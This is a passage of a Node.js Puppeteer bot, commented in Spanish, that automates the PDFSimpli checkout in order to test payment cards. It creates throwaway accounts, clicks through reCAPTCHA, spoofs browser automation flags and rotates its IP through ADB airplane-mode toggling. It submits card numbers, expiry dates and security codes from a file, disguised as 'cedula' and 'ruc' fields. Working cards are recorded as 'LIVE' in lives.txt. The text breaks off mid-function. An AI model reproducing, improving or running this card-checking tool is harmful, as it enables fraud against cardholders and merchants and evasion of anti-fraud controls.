// 🔥 KATY20 PRO — ULTRA FINAL
// FLUJO COMPLETO + RÁPIDO + CLOSE KILLER + LOOP DE CUENTAS
// + ELIMINAR TARJETAS + ARCHIVO VALIDAS / INVALIDAS + ADB IP CHANGE

const puppeteer = require('puppeteer-core');
const fs = require('fs').promises;
const path = require('path');
const { exec } = require('child_process');
const util = require('util');

const execAsync = util.promisify(exec);

// 🎨 COLORES PARA LOGS
const COLORS = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m"
};

// ======================================================
// 🔥 CAPTCHA SOLVER UNIVERSAL MEJORADO (ACTUALIZADO)
// ======================================================
class CaptchaSolver {
    constructor(page, log = console.log) {
        this.page = page;
        this.log = log;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async clickRecaptchaUniversal() {
        await this.log("🔍 Buscando frame del reCAPTCHA...");

        // Encontrar frame del anchor
        const anchorFrame = this.page.frames().find(f =>
            f.url().includes("recaptcha/api2/anchor")
        );

        if (!anchorFrame) {
            await this.log("❌ No se detectó el frame del anchor");
            return false;
        }

        await this.log("✅ Frame anchor detectado");

        // Intento 1: Buscar checkbox normal
        let checkbox = await anchorFrame.$("#recaptcha-anchor");

        if (!checkbox) {
            await this.log("❌ Checkbox no visible, usando HammerClick...");
        }

        try {
            // Evaluar coordenadas dentro del frame
            const pos = await anchorFrame.evaluate(() => {
                const el = document.querySelector("#recaptcha-anchor");
                if (!el) return null;

                const rect = el.getBoundingClientRect();
                return {
                    x: rect.x + rect.width / 2,
                    y: rect.y + rect.height / 2
                };
            });

            if (!pos) {
                await this.log("❌ No se pudo obtener posición del recaptcha");
                return false;
            }

            // Traducir coordenadas del frame → a la página completa
            const frameBounding = await anchorFrame.boundingBox();
            if (!frameBounding) {
                await this.log("❌ No se pudo obtener bounding box del frame");
                return false;
            }

            const clickX = frameBounding.x + pos.x;
            const clickY = frameBounding.y + pos.y;

            // Click real por coordenadas
            await this.page.mouse.move(clickX, clickY);
            await this.delay(50);
            await this.page.mouse.down();
            await this.delay(120);
            await this.page.mouse.up();

            await this.log("🟢 RECAPTCHA CLICK ENVIADO (HammerClick)");

            return true;

        } catch (e) {
            await this.log("❌ Error haciendo HammerClick: " + e.message);
            return false;
        }
    }

    async clickReCaptcha() {
        await this.log("🔍 Buscando frame del reCAPTCHA...");

        // 1. Buscar frame del anchor
        let anchorFrame = null;
        for (const f of this.page.frames()) {
            if (f.url().includes("recaptcha/api2/anchor")) {
                anchorFrame = f;
                break;
            }
        }

        if (!anchorFrame) {
            await this.log("❌ No se detectó el frame del anchor");
            return false;
        }

        await this.log("✅ Frame anchor detectado");

        // 2. Detectar checkbox
        let checkbox = await anchorFrame.$("#recaptcha-anchor");

        if (!checkbox) {
            await this.log("❌ No se encontró el checkbox del recaptcha");
            return false;
        }

        await this.log("🟦 Checkbox encontrado, haciendo click...");

        // 3. Intento 1: Click normal
        try {
            await checkbox.click({ delay: 100 });
            await this.log("✅ Click directo enviado");
        } catch (err) {
            await this.log("⚠️ Error en click directo, probando fallback...");
        }

        // 4. Intento 2: Click con coordenadas (fallback)
        try {
            const box = await checkbox.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.page.mouse.down();
                await this.delay(80);
                await this.page.mouse.up();
                await this.log("✅ Click por coordenadas enviado");
            } else {
                await this.log("❌ No se pudo obtener bounding box para click");
                return false;
            }
        } catch (e) {
            await this.log("❌ Fallback falló: " + e.message);
            return false;
        }

        return true;
    }

    async solve() {
        try {
            await this.delay(2000);
            
            await this.log("🔍 Iniciando solución de CAPTCHA...");

            // PRIMERO: Intentar método UNIVERSAL MEJORADO
            const universalResult = await this.clickRecaptchaUniversal();
            
            if (universalResult) {
                await this.delay(3000);
                
                // Verificar si se resolvió
                for (let i = 0; i < 5; i++) {
                    try {
                        for (const f of this.page.frames()) {
                            if (f.url().includes("recaptcha/api2/anchor")) {
                                const isChecked = await f.$eval(
                                    "#recaptcha-anchor",
                                    el => el.getAttribute("aria-checked") === "true"
                                );
                                if (isChecked) {
                                    await this.log("🟢 CAPTCHA resuelto (método UNIVERSAL MEJORADO)");
                                    return true;
                                }
                            }
                        }
                    } catch (_) { }
                    await this.delay(1200);
                }
            }

            // SEGUNDO: Método original como fallback
            await this.log("🔄 Usando método clásico de CAPTCHA...");
            
            const recaptchaResult = await this.clickReCaptcha();
            
            if (recaptchaResult) {
                await this.delay(3000);
                
                // Verificar si se resolvió
                for (let i = 0; i < 5; i++) {
                    try {
                        for (const f of this.page.frames()) {
                            if (f.url().includes("recaptcha/api2/anchor")) {
                                const isChecked = await f.$eval(
                                    "#recaptcha-anchor",
                                    el => el.getAttribute("aria-checked") === "true"
                                );
                                if (isChecked) {
                                    await this.log("🟢 CAPTCHA resuelto (método clásico)");
                                    return true;
                                }
                            }
                        }
                    } catch (_) { }
                    await this.delay(1200);
                }
            }

            // TERCERO: Método universal alternativo
            await this.log("🔄 Usando método universal alternativo...");
            
            let anchor = null, frameFound = null;

            for (let i = 0; i < 12; i++) {
                for (const f of this.page.frames()) {
                    anchor =
                        await f.$("#recaptcha-anchor") ||
                        await f.$(".recaptcha-checkbox-checkmark") ||
                        await f.$(".recaptcha-checkbox");

                    if (anchor) {
                        frameFound = f;
                        await this.log(`✅ CAPTCHA encontrado en ${f.url().slice(0, 60)}...`);
                        break;
                    }
                }
                if (anchor) break;
                await this.delay(700);
            }

            if (!anchor) {
                await this.log("⏩ No hay CAPTCHA detectable");
                return true;
            }

            const box = await anchor.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(100);
                await this.page.mouse.down();
                await this.delay(80);
                await this.page.mouse.up();
            } else {
                await anchor.click();
            }

            await this.delay(3000);

            for (let i = 0; i < 5; i++) {
                try {
                    const ok = await frameFound.$eval(
                        "#recaptcha-anchor",
                        el => el.getAttribute("aria-checked") === "true"
                    );
                    if (ok) {
                        await this.log("🟢 CAPTCHA resuelto (método universal)");
                        return true;
                    }
                } catch (_) { }
                await this.delay(1200);
            }

            await this.log("⚠️ CAPTCHA requiere intervención manual");
            await this.delay(8000);
            return true;

        } catch (e) {
            await this.log("⚠️ Error en captcha: " + e.message);
            return true;
        }
    }
}

// ======================================================
// 🔥 ADB MANAGER - CAMBIO DE IP CADA 2 CUENTAS (6 TARJETAS)
// ======================================================
class ADBManager {
    constructor(log = console.log) {
        this.log = log;
        this.cuentaCounter = 0; // ✅ CONTADOR DE CUENTAS, NO DE TARJETAS
        this.ipCheckUrl = "http://httpbin.org/ip";
        this.currentIP = null;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async executeCommand(command) {
        try {
            const { stdout, stderr } = await execAsync(command, { timeout: 30000 });
            if (stderr) {
                await this.log(`⚠️ ADB stderr: ${stderr}`);
            }
            return stdout.trim();
        } catch (error) {
            await this.log(`❌ Error ejecutando comando: ${command} - ${error.message}`);
            return null;
        }
    }

    async getCurrentIP() {
        try {
            const response = await fetch(this.ipCheckUrl);
            const data = await response.json();
            return data.origin;
        } catch (error) {
            await this.log(`⚠️ No se pudo obtener IP actual: ${error.message}`);
            return null;
        }
    }

    async checkADBConnection() {
        await this.log("📱 Verificando conexión ADB...");
        
        const devices = await this.executeCommand("adb devices");
        if (!devices) {
            await this.log("❌ ADB no disponible");
            return false;
        }

        const lines = devices.split('\n');
        const connectedDevices = lines.filter(line => line.endsWith('\tdevice'));
        
        if (connectedDevices.length === 0) {
            await this.log("❌ No hay dispositivos ADB conectados");
            return false;
        }

        await this.log(`✅ Dispositivos ADB conectados: ${connectedDevices.length}`);
        return true;
    }

    async changeIP() {
        await this.log(`${COLORS.blue}🔄 INICIANDO CAMBIO DE IP VÍA ADB${COLORS.reset}`);
        
        this.currentIP = await this.getCurrentIP();
        if (this.currentIP) {
            await this.log(`🌐 IP actual: ${this.currentIP}`);
        }

        const commands = [
            "adb shell settings put global airplane_mode_on 1",
            "adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true",
            "adb wait-for-device",
            "adb shell sleep 3",
            "adb shell settings put global airplane_mode_on 0", 
            "adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false",
            "adb wait-for-device",
            "adb shell sleep 5"
        ];

        let success = false;

        for (let attempt = 1; attempt <= 3; attempt++) {
            await this.log(`🔄 Intento ${attempt}/3 de cambio de IP...`);

            for (const cmd of commands) {
                await this.executeCommand(cmd);
                await this.delay(2000);
            }

            await this.delay(8000);

            const newIP = await this.getCurrentIP();
            if (newIP && newIP !== this.currentIP) {
                await this.log(`${COLORS.green}✅ IP cambiada exitosamente: ${this.currentIP} → ${newIP}${COLORS.reset}`);
                this.currentIP = newIP;
                success = true;
                break;
            } else {
                await this.log(`⚠️ Intento ${attempt} fallado - IP no cambió`);
            }
        }

        if (!success) {
            await this.log(`${COLORS.red}❌ NO SE PUDO CAMBIAR LA IP - DETENIENDO BOT${COLORS.reset}`);
            return false;
        }

        return true;
    }

    // ✅ VERIFICAR CAMBIO DE IP AL INICIO DE CADA CUENTA
    async checkAndChangeIP() {
        this.cuentaCounter++;
        
        // 🔥 CAMBIO DE IP CADA 2 CUENTAS (6 TARJETAS)
        if (this.cuentaCounter % 2 === 0) {
            await this.log(`${COLORS.yellow}📊 Cuenta número ${this.cuentaCounter} - SOLICITANDO CAMBIO DE IP${COLORS.reset}`);
            
            const adbAvailable = await this.checkADBConnection();
            if (!adbAvailable) {
                await this.log(`${COLORS.red}❌ ADB NO DISPONIBLE - BOT DETENIDO${COLORS.reset}`);
                return false;
            }

            const ipChanged = await this.changeIP();
            if (!ipChanged) {
                await this.log(`${COLORS.red}❌ NO SE PUDO CAMBIAR IP - BOT DETENIDO${COLORS.reset}`);
                return false;
            }

            await this.log("✅ Cambio de IP completado - Continuando flujo...");
            await this.delay(3000);
        } else {
            await this.log(`📊 Contador de cuentas: ${this.cuentaCounter}/2 para próximo cambio de IP`);
        }

        return true;
    }
}

// ======================================================
// 🔥 KATY20 – BRAIN ENGINE
// ======================================================
class PDFSimpliBot {
    constructor() {
        this.baseDir = "/data/data/com.termux/files/home/botdata";
        this.logFile = path.join(this.baseDir, "bot_log.txt");
        this.cuentasFile = path.join(this.baseDir, "cuentas_pdfsimpli.json");
        this.livesFile = path.join(this.baseDir, "lives.txt");

        this.CHROMIUM_PATHS = [
            "/data/data/com.termux/files/usr/bin/chromium",
            "/data/data/com.termux/files/usr/bin/chromium-browser",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium",
            "/snap/bin/chromium"
        ];

        this.browser = null;
        this.page = null;

        // 🔢 CONTROL DE TARJETAS
        this.tarjetas = [];
        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        // 🔄 ADB MANAGER
        this.adbManager = new ADBManager(this.log.bind(this));
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async log(msg) {
        const t = `[${new Date().toISOString()}] ${msg}`;
        console.log(t);
        await fs.appendFile(this.logFile, t + "\n");
    }

    async ensureDir(d) {
        try { await fs.mkdir(d, { recursive: true }); } catch (_) { }
    }

    async findChromium() {
        for (const p of this.CHROMIUM_PATHS) {
            try { await fs.access(p); return p; } catch (_) { }
        }
        throw new Error("❌ Chromium no encontrado");
    }

    async deepFind(selector) {
        let el = await this.page.$(selector);
        if (el) return el;

        for (const f of this.page.frames()) {
            try {
                el = await f.$(selector);
                if (el) return el;
            } catch (_) { }
        }

        return null;
    }

    // =============================================================
    // CLICK UNIVERSAL
    // =============================================================
    async ultraClick(selector) {
        for (let i = 0; i < 5; i++) {
            const el = await this.deepFind(selector);
            if (el) {
                try {
                    const box = await el.boundingBox();
                    if (box) {
                        await this.page.mouse.move(
                            box.x + box.width / 2,
                            box.y + box.height / 2
                        );
                        await this.delay(70);
                        await this.page.mouse.down();
                        await this.delay(60);
                        await this.page.mouse.up();
                        return true;
                    } else {
                        await el.click();
                        return true;
                    }
                } catch (_) { }
            }
            await this.delay(350);
        }
        return false;
    }

    // =============================================================
    // INIT
    // =============================================================
    async initialize() {
        await this.ensureDir(this.baseDir);
        await this.ensureDir(path.join(this.baseDir, "documents"));
        await this.ensureDir(path.join(this.baseDir, "downloads"));

        const chromium = await this.findChromium();

        this.browser = await puppeteer.launch({
            executablePath: chromium,
            headless: false,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-accelerated-2d-canvas",
                "--no-first-run",
                "--no-zygote",
                "--disable-gpu",
                "--disable-web-security",
                "--disable-blink-features=AutomationControlled",
                "--window-size=1920,1080"
            ]
        });

        this.page = await this.browser.newPage();
        
        await this.page.setUserAgent('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await this.page.setViewport({ width: 1920, height: 1080 });

        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        });

        await this.log("🚀 KATY20 — Iniciado en modo VISUAL con sistema ADB integrado");
    }

    // =============================================================
    // TARJETAS: LECTURA MÚLTIPLE
    // =============================================================
    async loadAllTarjetas() {
        const raw = await fs.readFile(path.join(this.baseDir, "tarjetas.txt"), "utf8");
        this.tarjetas = raw
            .split(/\r?\n/)
            .map(l => l.trim())
            .filter(Boolean)
            .map(line => {
                const [cedula, mes, anio, ruc] = line.split("|");
                return { cedula, mes, anio, ruc };
            });

        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        await this.log(`💾 Tarjetas cargadas: ${this.tarjetas.length}`);
    }

    getNextTarjeta() {
        if (this.tarjetaIndex >= this.tarjetas.length) return null;
        const t = this.tarjetas[this.tarjetaIndex];
        this.tarjetaIndex++;
        return t;
    }

    async guardarCedulaValida(t) {
        const line = `${t.cedula}|${t.mes}|${t.anio}|${t.ruc}|VALIDA|${new Date().toISOString()}\n`;
        await fs.appendFile(this.livesFile, line);
        await this.log(`💾 LIVE GUARDADA: ${t.cedula}`);
    }

    // =============================================================
    // 🧹 ELIMINAR TARJETA PROCESADA DE tarjetas.txt
    // =============================================================
    async eliminarTarjetaDelArchivo(tarjeta) {
        try {
            const file = path.join(this.baseDir, "tarjetas.txt");
            const raw = await fs.readFile(file, "utf8");

            const lineToRemove = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}`;

            const newData = raw
                .split(/\r?\n/)
                .filter(l => l.trim() && l.trim() !== lineToRemove)
                .join("\n");

            await fs.writeFile(file, newData);
            await this.log(`🗑️ Tarjeta eliminada del archivo: ${lineToRemove}`);

        } catch (e) {
            await this.log("⚠️ Error eliminando tarjeta del archivo: " + e.message);
        }
    }

    // =============================================================
    // 📦 GUARDAR TARJETA SEGÚN RESULTADO
    // =============================================================
    async guardarTarjetaEnArchivo(tarjeta, esValida) {
        try {
            const file = path.join(
                this.baseDir,
                esValida ? "validas.txt" : "invalidas.txt"
            );

            const line = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}|${
                esValida ? "VALIDA" : "INVALIDA"
            }|${new Date().toISOString()}\n`;

            await fs.appendFile(file, line);

            await this.log(
                `📦 Tarjeta movida a ${esValida ? "validas.txt" : "invalidas.txt"}: ${
                    tarjeta.cedula
                }`
            );

        } catch (e) {
            await this.log("⚠️ Error guardando tarjeta en archivo: " + e.message);
        }
    }

    // =============================================================
    // SUBIR PDF
    // =============================================================
    async uploadPDF() {
        await this.log("📄 Buscando input file...");
        const input = await this.deepFind('input[type="file"]');

        if (!input) throw new Error("❌ Input file no encontrado");

        const docs = path.join(this.baseDir, "documents");
        const files = await fs.readdir(docs);
        const pdf = files.find(f => f.endsWith(".pdf"));
        if (!pdf) throw new Error("❌ No hay PDF");

        const pdfPath = path.join(docs, pdf);
        await input.uploadFile(pdfPath);

        await this.log("📁 PDF subido: " + pdfPath);
        await this.delay(9000);
    }

    // =============================================================
    // GET STARTED
    // =============================================================
    async clickLetsGetStarted() {
        await this.log("🔍 GET STARTED...");

        let ok = await this.ultraClick("#preEditPop");
        if (!ok) {
            ok = await this.page.evaluate(() => {
                for (const b of document.querySelectorAll("button,div,a")) {
                    if ((b.innerText || "").toLowerCase().includes("get started")) {
                        b.click(); return true;
                    }
                }
                return false;
            });
        }

        if (!ok) throw new Error("❌ GET STARTED no encontrado");

        await this.log("🟢 GET STARTED presionado");
        await this.delay(3000);
    }

    // =============================================================
    // CONVERT
    // =============================================================
    async clickConvert() {
        await this.log("⚙️ Esperando Convert...");

        let btn = null;

        for (let i = 0; i < 20; i++) {
            for (const f of this.page.frames()) {
                btn =
                    await f.$("#ConvertContinue") ||
                    await f.$("button[data-test='convert']") ||
                    await f.$(".button-convert");

                if (btn) break;
            }

            if (btn) break;

            if (i % 5 === 0)
                await this.log(`⏳ Convert intento ${i}/20`);

            await this.delay(900);
        }

        if (!btn) throw new Error("❌ Convert no apareció");

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.log("🟢 Convert presionado");
        await this.delay(6000);
    }

    // =============================================================
    // DOWNLOAD
    // =============================================================
    async clickDownload() {
        await this.log("⬇️ DOWNLOAD...");

        await this.page._client().send("Page.setDownloadBehavior", {
            behavior: "allow",
            downloadPath: path.join(this.baseDir, "downloads")
        });

        const ok = await this.ultraClick("#congDwnaut");
        if (!ok) {
            await this.log("⚠️ DOWNLOAD no disponible ahora");
            return false;
        }

        await this.log("📥 DOWNLOAD presionado");
        await this.delay(6000);
        return true;
    }

    // =============================================================
    // REGISTRO
    // =============================================================
    async handleRegistration() {
        await this.log("🧑‍💻 Registro...");

        const emailInput = await this.deepFind("#email");
        if (!emailInput) {
            await this.log("✔️ No pidió registro");
            return;
        }

        const passInput = await this.deepFind("#password");

        const email = `user${Date.now()}@gmail.com`;
        const pass = "P" + Math.random().toString(36).slice(2, 8) + "!";

        await emailInput.type(email);
        if (passInput) await passInput.type(pass);

        await this.ultraClick("#sign-up");

        await this.log("⏳ CAPTCHA...");
        await this.delay(8000);

        const solver = new CaptchaSolver(this.page, this.log.bind(this));
        await solver.solve();

        await this.log(`🟢 Cuenta creada: ${email}`);
        await this.delay(1500);
    }

    // =============================================================
    // SAFE CONTINUE
    // =============================================================
    async safeFindContinueButton() {
        try {
            for (const f of this.page.frames()) {
                const btn =
                    await f.$("#planPageContinueButton") ||
                    await f.$("button[data-test='continue']") ||
                    await f.$(".continue-button") ||
                    await f.$("button[id*='continue' i]") ||
                    await f.$("a[id*='continue' i]") ||
                    await f.$("div[id*='continue' i]") ||
                    await f.$("button[class*='continue' i]") ||
                    await f.$("a[class*='continue' i]") ||
                    await f.$("div[class*='continue' i]");

                if (btn) return btn;
            }

            const handle = await this.page.evaluateHandle(() => {
                const tags = ["button", "a", "div", "input"];
                for (const t of tags) {
                    for (const el of document.querySelectorAll(t)) {
                        const txt = (el.innerText || el.value || "").toLowerCase();
                        if (txt.includes("continue")) return el;
                    }
                }
                return null;
            });

            if (handle && handle.asElement) return handle.asElement();

            const list = [
                "button[id*='continue' i]",
                "button[class*='continue' i]",
                "button[data-id*='continue' i]",
                "a[class*='continue' i]",
                "a[id*='continue' i]",
                "input[type='button'][value*='continue' i]"
            ];

            for (const s of list) {
                const el = await this.page.$(s);
                if (el) return el;
            }

            return null;

        } catch (e) {
            console.log("❌ safeFindContinueButton:", e);
            return null;
        }
    }

    async waitAndClickContinueToPayment() {
        await this.log("🔍 Buscando botón CONTINUE (plan)...");

        let btn = null;

        for (let i = 0; i < 20; i++) {
            btn = await this.safeFindContinueButton();
            if (btn) break;

            if (i % 5 === 0)
                await this.log(`⏳ CONTINUE intento ${i}/20`);

            await this.delay(1000);
        }

        if (!btn) throw new Error("❌ CONTINUE no apareció (plan)");

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.delay(5000);
        await this.log("🟢 CONTINUE presionado → entrando a PAGO...");
    }

    // =============================================================
    // FORMULARIO COMPLETO (FLUJO COMPLETO)
    // =============================================================
    async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
        await this.log("🧾 Llenando formulario COMPLETO...");

        const nombreField =
            await this.deepFind("#checkout_form_card_name") ||
            await this.deepFind("[name='cardName']");

        if (!nombreField) throw new Error("❌ Campo NOMBRE no encontrado");

        await nombreField.click({ clickCount: 3 });
        await nombreField.type(nombre);

        const mesOk = await this.page.evaluate((mesStr) => {
            const s = document.querySelector("select[name='ccMonthExp'], #expmo");
            if (!s) return false;
            const v = String(parseInt(mesStr, 10));
            if (!v || v === "NaN") return false;
            s.value = v;
            ["input", "change", "blur"].forEach(ev =>
                s.dispatchEvent(new Event(ev, { bubbles: true }))
            );
            return true;
        }, mes);

        if (!mesOk) throw new Error("❌ No se pudo seleccionar el MES");

        await this.delay(2000);

        const anioOk = await this.page.evaluate((anioStr) => {
            const s = document.querySelector("select[name='ccYearExp'], #expyr");
            if (!s) return false;
            const v = String(parseInt(anioStr, 10));
            if (!v || v === "NaN") return false;
            s.value = v;
            ["input", "change", "blur"].forEach(ev =>
                s.dispatchEvent(new Event(ev, { bubbles: true }))
            );
            return true;
        }, anio);

        if (!anioOk) throw new Error("❌ No se pudo seleccionar el AÑO");

        const frames = this.page.frames();
        let cedulaField = null;

        for (const f of frames) {
            const cand = await f.$("input[name='cardNumber'], input#data");
            if (!cand) continue;

            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            if (maxLen && parseInt(maxLen, 10) >= 16) {
                cedulaField = cand;
                break;
            }
        }

        if (!cedulaField) throw new Error("❌ Campo número de tarjeta no encontrado");

        await cedulaField.click({ clickCount: 3 });
        await cedulaField.type(cedula);

        let rucField = null;
        for (const f of frames) {
            const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
            if (!cand) continue;

            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            if (maxLen === "4") {
                rucField = cand;
                break;
            }
        }

        if (!rucField) throw new Error("❌ Campo RUC no encontrado");

        await rucField.click({ clickCount: 3 });
        await rucField.type(ruc);

        let checkbox = await this.deepFind("#acceptCheckboxMark");
        if (!checkbox) throw new Error("❌ Checkbox de aceptación no encontrado");

        await this.page.evaluate(el => el.click(), checkbox);

        let submit = await this.deepFind("#btnChargeebeeSubmit");
        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado");

        await this.page.evaluate(
            el => el.scrollIntoView({ behavior: "instant" }),
            submit
        );
        await submit.click();

        await this.log("🚀 Pago enviado (FLUJO COMPLETO)");
        await this.delay(2000);
    }

    // =============================================================
    // FLUJO RÁPIDO
    // =============================================================
    async fillCardFast(cedula, ruc) {
        await this.log("⚡ FLUJO RÁPIDO: solo número + RUC...");

        const frames = this.page.frames();
        let cedulaField = null;

        for (const f of frames) {
            const cand = await f.$("input[name='cardNumber'], input#data");
            if (!cand) continue;

            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            if (maxLen && parseInt(maxLen, 10) >= 16) {
                cedulaField = cand;
                break;
            }
        }

        if (!cedulaField) throw new Error("❌ No se encontró campo de número (rápido)");

        await cedulaField.click({ clickCount: 3 });
        await cedulaField.type(cedula);

        let rucField = null;
        for (const f of frames) {
            const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
            if (!cand) continue;

            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            if (maxLen === "4") {
                rucField = cand;
                break;
            }
        }

        if (!rucField) throw new Error("❌ No se encontró campo RUC (rápido)");

        await rucField.click({ clickCount: 3 });
        await rucField.type(ruc);

        let submit = await this.deepFind("#btnChargeebeeSubmit");
        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado (rápido)");

        await this.page.evaluate(
            el => el.scrollIntoView({ behavior: "instant" }),
            submit
        );
        await submit.click();

        await this.log("🚀 Pago enviado (FLUJO RÁPIDO)");
        await this.delay(2000);
    }

    // =============================================================
    // CLOSE KILLER
    // =============================================================
    async findCloseButton() {
        const frames = [this.page, ...this.page.frames()];

        for (const ctx of frames) {
            try {
                const handle = await ctx.evaluateHandle(() => {
                    const all = [...document.querySelectorAll("button")];
                    return (
                        all.find(b => {
                            const text = (b.innerText || "").trim().toLowerCase();
                            const cls = b.className || "";
                            const tracker = b.getAttribute("data-tracker") === "true";

                            const looksLike =
                                cls.includes("bg-ps-reskin-radial") ||
                                cls.includes("rounded-3xl");

                            return (
                                text.includes("close") &&
                                (tracker || looksLike || text === "close")
                            );
                        }) || null
                    );
                });
                if (handle && handle.asElement()) return handle.asElement();
            } catch (_) { }
        }

        const selectors = [
            "button[data-tracker='true']",
            "button[class*='bg-ps-reskin-radial']",
            "button[class*='rounded-3xl']",
            "button"
        ];

        for (const ctx of frames) {
            for (const sel of selectors) {
                try {
                    const btns = await ctx.$$(sel);
                    for (const b of btns) {
                        const text = (await b.evaluate(el => el.innerText || "")).trim().toLowerCase();
                        if (text.includes("close")) return b;
                    }
                } catch (_) { }
            }
        }

        return null;
    }

    async closeErrorModal() {
        await this.log("🔎 Buscando botón Close...");

        let foundAny = false;

        for (let intento = 0; intento < 12; intento++) {
            const btn = await this.findCloseButton();

            if (!btn) {
                if (!foundAny) {
                    await this.log("🟢 No hay modal de error visible (sin Close)");
                    return false;
                } else {
                    await this.log("🟢 Modal ya cerrado");
                    return true;
                }
            }

            foundAny = true;
            await this.log(`🔴 Close detectado → click intento ${intento + 1}`);

            try {
                await this.page.evaluate(el => {
                    el.scrollIntoView({ behavior: "instant", block: "center" });
                }, btn);
            } catch (_) { }

            try {
                const box = await btn.boundingBox();
                if (box) {
                    await this.page.mouse.move(
                        box.x + box.width / 2,
                        box.y + box.height / 2
                    );
                    await this.delay(80);
                    await this.page.mouse.down();
                    await this.delay(70);
                    await this.page.mouse.up();
                } else {
                    await this.page.evaluate(el => el.click(), btn);
                }
            } catch (_) { }

            await this.delay(1000);
        }

        if (foundAny) {
            await this.log("💣 FORCE MODE → Eliminando modal por DOM");
            try {
                await this.page.evaluate(() => {
                    [...document.querySelectorAll("button")].forEach(b => {
                        if ((b.innerText || "").toLowerCase().includes("close")) {
                            let p = b;
                            for (let i = 0; i < 5; i++) {
                                if (!p.parentElement) break;
                                p = p.parentElement;
                            }
                            p.remove();
                        }
                    });
                });
            } catch (_) { }

            await this.delay(500);
            await this.log("🟢 Modal destruido (Force Mode)");
            return true;
        }

        return false;
    }

    // =============================================================
    // VERIFICAR RESULTADO (20 SEGUNDOS)
    // =============================================================
    async verificarResultadoPago(tarjetaActual) {
        const cedulaTxt = tarjetaActual ? tarjetaActual.cedula : "N/A";

        await this.log("⏳ Esperando 20 segundos para que procese el pago...");
        await this.delay(20000);

        const startCheck = Date.now();
        const maxCheck = 20000;
        let success = false;

        while (Date.now() - startCheck < maxCheck) {
            const currentUrl = this.page.url();
            const pageSource = (await this.page.content()).toLowerCase();

            if (currentUrl.includes("pdfsimpli.com/app/billing/confirmation")) {
                success = true;
            }

            if (!success) {
                try {
                    const visibleSuccess = await this.page.evaluate(() => {
                        const terms = ["payment successful", "thank you", "transaction completed"];
                        const all = [...document.querySelectorAll("body, body *")];
                        for (const el of all) {
                            const txt = (el.innerText || "").toLowerCase();
                            if (!txt) continue;
                            if (terms.some(t => txt.includes(t))) return true;
                        }
                        return false;
                    });
                    if (visibleSuccess) success = true;
                } catch (_) { }
            }

            if (!success) {
                const terms = ["payment successful", "thank you", "transaction completed"];
                if (terms.some(t => pageSource.includes(t))) {
                    success = true;
                }
            }

            if (success) break;

            await this.delay(1000);
        }

        if (success) {
            await this.log(
                `${COLORS.green}✅ TARJETA VÁLIDA — PAGO EXITOSO (${cedulaTxt})${COLORS.reset}`
            );
            if (tarjetaActual) await this.guardarCedulaValida(tarjetaActual);
            return true;
        }

        const hadClose = await this.closeErrorModal();
        if (hadClose) {
            await this.log(
                `${COLORS.red}❌ TARJETA INVÁLIDA — MODAL CLOSE DETECTADO (${cedulaTxt})${COLORS.reset}`
            );
            return false;
        }

        const src = (await this.page.content()).toLowerCase();
        const errorTerms = ["declined", "error", "invalid", "failed", "rejected"];
        if (errorTerms.some(t => src.includes(t))) {
            await this.log(
                `${COLORS.red}❌ TARJETA INVÁLIDA — MENSAJE DE ERROR DETECTADO (${cedulaTxt})${COLORS.reset}`
            );
            return false;
        }

        await this.log(
            `${COLORS.red}❌ TARJETA INVÁLIDA — TIMEOUT SIN ÉXITO NI CLOSE (${cedulaTxt})${COLORS.reset}`
        );
        return false;
    }

    // =============================================================
    // PROCESO TARJETA (AQUÍ SE GUARDAN Y SE ELIMINAN)
    // =============================================================
    async procesarTarjeta(tarjeta, usarRapido) {
        const { cedula, mes, anio, ruc } = tarjeta;
        const nombre = "User" + Math.random().toString(36).slice(2, 7);

        if (!usarRapido) {
            await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
        } else {
            await this.fillCardFast(cedula, ruc);
        }

        const ok = await this.verificarResultadoPago(tarjeta);

        await this.guardarTarjetaEnArchivo(tarjeta, ok);
        await this.eliminarTarjetaDelArchivo(tarjeta);

        return ok;
    }

    // =============================================================
    // FLUJO PRINCIPAL (3 TARJETAS POR CUENTA + VERIFICACIÓN IP)
    // =============================================================
    async executeFlowCuenta() {
        // ✅ VERIFICAR CAMBIO DE IP AL INICIO DE CADA CUENTA
